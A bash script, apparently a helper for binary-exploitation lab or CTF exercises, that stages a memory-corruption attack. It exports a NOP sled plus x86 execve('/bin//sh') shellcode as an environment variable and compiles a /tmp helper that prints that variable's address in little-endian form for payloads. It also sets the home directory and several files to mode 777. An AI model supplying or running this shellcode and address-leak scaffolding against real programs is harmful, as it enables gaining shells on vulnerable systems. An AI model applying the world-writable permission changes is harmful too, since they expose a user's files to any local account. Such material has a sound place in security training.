#!/usr/bin/env bash

chmod 777 ~
touch ~/exploit
chmod 777 ~/exploit
echo 'chmod 777 ~'

if test -f ~/.gdbinit
then
chmod 777 ~/.gdbinit
fi

echo "source /tmp/peda/peda.py" > ~/.gdbinit
echo 'echo "source /tmp/peda/peda.py" > ~/.gdbinit'


if test ! -d /tmp/peda
then
echo "[WARNING] peda is not in /tmp"
fi

export SHELLCODE=$(python -c 'print 100*"\x90" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
echo 'SHELLCODE = 100*nop \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

if test ! -f /tmp/getenv.c
then
chmod 777 /tmp/init.sh
echo '#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int main(int ac, char **av)
{
    if (ac != 2)
        av[1] = "SHELLCODE";
    int nb = ((int)getenv(av[1])) + 50;
    printf("\\x%02x\\x%02x\\x%02x\\x%02x", (nb >> 0) & 0xff, (nb >> 8) & 0xff, (nb >> 16) & 0xff, (nb >> 24) & 0xff);
}' > /tmp/getenv.c
echo "/tmp/getenv.c created"
chmod 777 /tmp/getenv.c

gcc /tmp/getenv.c -o /tmp/getenv
echo "/tmp/getenv compiled"
chmod 777 /tmp/getenv
fi

export SCADDR=$(python -c 'import sys; print sys.argv[1].replace("\\x", "").decode("hex")' $(/tmp/getenv SHELLCODE))
echo "SCADDR = $(/tmp/getenv SHELLCODE)"

